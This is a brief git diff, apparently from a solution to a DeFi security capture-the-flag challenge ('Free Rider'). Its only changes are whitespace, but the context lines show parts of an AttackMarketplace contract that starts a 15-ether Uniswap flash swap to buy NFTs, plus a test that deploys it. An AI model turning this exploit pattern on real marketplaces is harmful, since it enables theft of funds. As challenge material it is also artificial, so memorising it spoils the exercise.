@@ -51,6 +51,7 @@ contract AttackMarketplace is IERC721Receiver {
         i_weth.deposit{value: 16 ether}();
         i_weth.transfer(address(i_pair), 16 ether);
     }
+
     function attack() external {
         bytes memory data = abi.encode(15 ether, "buy nft");
         i_pair.swap(15 ether, 0, address(this), data);
@@ -180,7 +181,6 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-
         AttackMarketplace attackContract = new AttackMarketplace(
             marketplace, recoveryManager, nft, weth, uniswapPair
         );
